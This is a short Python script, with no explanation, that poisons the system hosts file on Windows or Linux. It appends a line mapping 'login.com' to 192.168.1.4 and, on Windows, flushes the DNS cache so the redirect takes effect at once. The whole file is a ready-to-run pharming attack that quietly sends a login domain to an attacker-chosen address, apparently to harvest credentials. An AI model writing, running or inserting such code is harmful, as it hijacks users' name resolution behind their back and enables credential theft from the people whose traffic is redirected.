import os, subprocess, platform
if "Windows" in platform.platform():

    os.chdir("C:\\Windows\System32\drivers\etc")
    command = "echo 192.168.1.4 login.com >> hosts"
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE )
    command = "ipconfig /flushdns"
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE )

elif "Linux" in platform.platform():

    os.chdir("/etc/")
    command = "echo 192.168.1.4 login.com >> hosts"
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE )

else:

    print("Unknown Operating System")